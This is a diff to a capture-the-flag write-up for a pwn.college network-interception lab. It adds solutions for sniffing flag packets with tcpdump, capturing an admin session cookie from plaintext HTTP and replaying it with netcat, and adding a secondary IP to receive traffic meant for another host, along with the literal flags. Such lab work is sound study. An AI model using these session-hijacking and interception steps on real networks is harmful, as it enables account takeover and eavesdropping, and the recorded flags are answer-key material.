@@ -20,17 +20,18 @@ published: true
 
 Every service you interact with over a network is just bytes moving across a socket. This module drills the mechanics of that exchange using `netcat` and `nmap`, then turns the same tools on your own traffic with Wireshark.
 
-| Challenge   | What it tests                                                          |
-| ----------- | ---------------------------------------------------------------------- |
-| **connect** | Establishing a TCP session with a listening service                     |
-| **send**    | Sending data over an established connection, with verbose diagnostics  |
-| **shutdown** | Half-closing a connection cleanly and reading the trailing response   |
-| **listen**  | Binding a listener and accepting an inbound connection                |
-| **scan-1**  | Sweeping the local `/24` for live hosts with `ping`                   |
-| **scan-2**  | Sweeping a full `/16` for an open port with `nmap`                    |
-| **monitor-1** | Capturing and inspecting packets with Wireshark                      |
-| **monitor-2** | Intercepting traffic that is not addressed to you *(pending)*         |
-| **monitor-3** | TLS interception against an encrypted service *(pending)*             |
+| Challenge              | What it tests                                                          |
+| ---------------------- | ---------------------------------------------------------------------- |
+| **connect**            | Establishing a TCP session with a listening service                     |
+| **send**               | Sending data over an established connection, with verbose diagnostics  |
+| **shutdown**           | Half-closing a connection cleanly and reading the trailing response   |
+| **listen**             | Binding a listener and accepting an inbound connection                |
+| **scan-1**             | Sweeping the local `/24` for live hosts with `ping`                   |
+| **scan-2**             | Sweeping a full `/16` for an open port with `nmap`                    |
+| **monitor-1**          | Capturing and inspecting packets with Wireshark                      |
+| **monitor-2**          | Capturing fragmented flags across network packets with `tcpdump` / Wireshark |
+| **sniffing-cookies**   | Sniffing session cookies from HTTP traffic and replaying to `/flag`   |
+| **network-config**     | Adding secondary IPs with `ip addr` to intercept host-specific traffic |
 
 <Callout type="info" title="Lab Topology">
   The `run` script drops you into a container with two interfaces. `10.0.0.1` is
@@ -238,10 +239,154 @@ Clicking **Start capturing packets** brings the interface up:
  ** (wireshark:72) 18:41:31.549665 [Capture MESSAGE] -- File: "/tmp/wireshark_eth0AUQKY3.pcapng"
 ```
 
-<Callout type="warning" title="Still In Progress">
-  The capture is running but the analysis portion of `monitor-1` — and the
-  `monitor-2` / `monitor-3` interception challenges — are not worked through
-  yet. This module is marked **In Progress** until they are.
+---
+
+### Monitor 2 — Raw Packet Sniffing
+
+In **Monitor 2**, network packets are flowing across `eth0` containing pieces of the flag. You can launch Wireshark or use `tcpdump` directly in ASCII mode:
+
+```bash
+hacker@intercepting-communication~monitor-2:~$ cd /challenge/
+hacker@intercepting-communication~monitor-2:/challenge$ ls
+DESCRIPTION.md  run
+hacker@intercepting-communication~monitor-2:/challenge$ ./run
+root@ip-10-0-0-1:/challenge# tcpdump -A | tee -a /tmp/wireshark.txt
+```
+
+As the packets stream in, fragments and recurring strings of the flag appear in the capture buffer:
+
+```text
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+BP1.S...pwn.college{E3G_zaUdErR3u9nakhsV_ozurzo.QXZyMzMwSM0cjM3EzW}
+......%pwn.college{E3G_zaUdErR3u9nakhsV_ozurzo.QXZyMzMwSM0cjM3EzW}
+|A.....{pwn.college{E3G_zaUdErR3u9nakhsV_ozurzo.QXZyMzMwSM0cjM3EzW}
+[P?fk!..pwn.college{E3G_zaUdErR3u9nakhsV_ozurzo.QXZyMzMwSM0cjM3EzW}
+```
+
+<Callout type="tip" title="Piecemeal Flag Extraction">
+If the terminal payload output is cluttered with TCP header noise or segmented across multiple packets, saving the stream with `tee` makes it easy to grep for `pwn.college{` or reconstruct the full token cleanly.
+</Callout>
+
+---
+
+## Sniffing Cookies
+
+This challenge demonstrates intercepting plaintext web traffic to hijack sessions. An automated process makes periodic HTTP requests across the internal network.
+
+### 1. Capture the HTTP Request
+
+Launch Wireshark:
+
+```bash
+hacker@intercepting-communication~sniffing-cookies:~$ cd /challenge/
+hacker@intercepting-communication~sniffing-cookies:/challenge$ ./run
+root@ip-10-0-0-1:/challenge# wireshark
+```
+
+Start capturing on `eth0`. Apply an `http` filter in Wireshark and inspect an outgoing `GET /ping` request. Copy the **Hypertext Transfer Protocol** payload as ASCII text:
+
+```http
+GET /ping HTTP/1.1
+Host: 10.0.0.2
+User-Agent: python-requests/2.32.4
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.avwM2A.7grH7Hsoj9LtVrdjFjKKhBE_8q0
+```
+
+Notice the cookie header contains an active session token: `session=eyJ1c2VyIjoiYWRtaW4ifQ...` (base64-decoding reveals `{"user":"admin"}`).
+
+### 2. Replay with Netcat against `/flag`
+
+Open netcat to `10.0.0.2:80`, change the endpoint from `/ping` to `/flag`, and pass the captured session cookie:
+
+```bash
+root@ip-10-0-0-1:/challenge# nc 10.0.0.2 80
+GET /flag HTTP/1.1
+Host: 10.0.0.2
+User-Agent: python-requests/2.32.4
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.avwM2A.7grH7Hsoj9LtVrdjFjKKhBE_8q0
+```
+
+Press Enter twice to complete the HTTP request headers. The server validates the admin session and returns the flag:
+
+```http
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.10
+Date: Tue, 17 Nov 2026 08:34:48 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 61
+Vary: Cookie
+Connection: close
+
+pwn.college{IAR0DfuDlspFhBroOLDdwgGkDum.0VM0AjNxwSM0cjM3EzW}
+```
+
+---
+
+## Network Configuration
+
+In this challenge, the target service is transmitting flags to an IP address that isn't currently assigned to your machine (`10.0.0.3`). You must configure your network interface to receive packets addressed to that destination.
+
+### 1. Inspect Current Interface Configuration
+
+```bash
+root@ip-10-0-0-1:/challenge# ip addr show eth0
+3: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether be:b4:99:e0:cc:e7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.0.0.1/24 scope global eth0
+       valid_lft forever preferred_lft forever
+
+root@ip-10-0-0-1:/challenge# ip route
+10.0.0.0/24 dev eth0 proto kernel scope link src 10.0.0.1
+```
+
+### 2. Add the Target IP Alias
+
+Assign `10.0.0.3/24` to `eth0` so the Linux kernel accepts packets sent to `10.0.0.3`:
+
+```bash
+root@ip-10-0-0-1:/challenge# ip addr add 10.0.0.3/24 dev eth0
+```
+
+Verify the new secondary IP address:
+
+```bash
+root@ip-10-0-0-1:/challenge# ip addr show eth0
+3: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+    inet 10.0.0.1/24 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet 10.0.0.3/24 scope global secondary eth0
+       valid_lft forever preferred_lft forever
+```
+
+<Callout type="info" title="Command Breakdown: ip addr add">
+- `ip addr`: Subcommand for managing IP addresses.
+- `add`: Assigns a new address to a device.
+- `10.0.0.3/24`: The destination IP address and subnet prefix.
+- `dev eth0`: Binds the address to the `eth0` network interface.
+</Callout>
+
+### 3. Catch the Incoming Connection
+
+Now start a netcat listener on port `31337`:
+
+```bash
+root@ip-10-0-0-1:/challenge# nc -lvnp 31337
+Listening on 0.0.0.0 31337
+Connection received on 10.0.0.2 48384
+pwn.college{coJv98q69Fg3FBySMKAGHAmig7u.QX1YzMzwSM0cjM3EzW}
+```
+
+<Callout type="tip" title="Netcat Flag Breakdown">
+- `-l`: Listen for incoming connections instead of initiating an outbound one.
+- `-v`: Verbose output (displays connection notices and remote IP/port).
+- `-n`: Numeric-only; prevents DNS lookup delays.
+- `-p 31337`: Specifies the local port to bind and listen on.
 </Callout>
 
 ---
